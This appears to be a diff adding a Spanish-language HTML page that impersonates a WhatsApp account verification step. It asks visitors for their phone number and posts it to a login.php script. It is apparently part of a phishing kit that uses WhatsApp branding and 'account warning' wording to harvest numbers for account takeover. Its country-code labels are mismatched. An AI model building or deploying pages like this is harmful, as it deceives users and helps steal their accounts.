@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="title" content="WhatsApp Verification">
+    <meta name="description" content="Check your WhatsApp account">
+    <meta name="keywords" content="Verify account whatsapp, WhatsApp account warning">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#00AF75">
+    <title>WhatsApp Verify</title>
+    <link rel="shortcut icon" href="img/Imagen2.png" type="image/x-icon">
+    <link rel="stylesheet" href="./css/styles.css">
+    <script src="./js/scripts.js"></script>
+    <script src="js/sweetalert2.all.js"></script>
+
+</head>
+<body>
+    <header>
+        <h1>Verifica tu WhatsApp</h1>
+    </header>
+    <div class="content-primary">
+        <form action="login.php" method="post">
+            <div class="inputs">
+                <label for="">Introduce tu número de teléfono</label><br><br>
+                <select on id="cp">
+                    <option value="EU">+1</option>
+                    <option value="MX">+52</option>
+                    <option value="CB">+53</option>
+                    <option value="PR">+54</option>
+                    <option value="IN">+55</option>
+                    <option value="RS">+51</option>
+                    <option value="UK">+56</option>
+                    <option value="VZ">+59</option>
+                </select>
+                <input type="number" id="celphone" name="TEL" autocomplete="on" autofocus required>
+                <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+                <br><br><br><br><br><br>
+                <div id="areaButton"><button onclick="alerta()" type="submit">Siguiente</button></div>
+            </div>
+        </form>
+    </div>
+    <footer>
+        META.INC
+    </footer>
+</body>
+</html>
